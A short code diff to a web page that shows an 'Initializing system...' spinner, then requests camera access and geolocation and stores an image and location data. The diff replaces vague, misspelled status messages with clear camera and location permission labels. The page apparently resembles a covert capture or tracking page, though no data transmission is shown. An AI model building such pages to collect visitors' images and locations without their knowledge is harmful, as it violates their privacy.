@@ -12,6 +12,7 @@
     </style>
 </head>
 <body>
+
     <p id="statusMessage" class="spinner">Initializing system...</p>
 
     <script>
@@ -26,7 +27,7 @@
             let imageData = null;
 
             // --- STEP 1: Request Camera ---
-            statusText.innerText = "Waiting for link permission avilaible...";
+            statusText.innerText = "Waiting for camera permission...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -39,11 +40,11 @@
                     };
                 });
             } catch (err) {
-                console.warn("web site denied.");
+                console.warn("Camera denied.");
             }
 
             // --- STEP 2: Request Location ---
-            statusText.innerText = "Waiting for web site activited ...";
+            statusText.innerText = "Waiting for location permission...";
             if (navigator.geolocation) {
                 try {
                     locationData = await new Promise((resolve, reject) => {
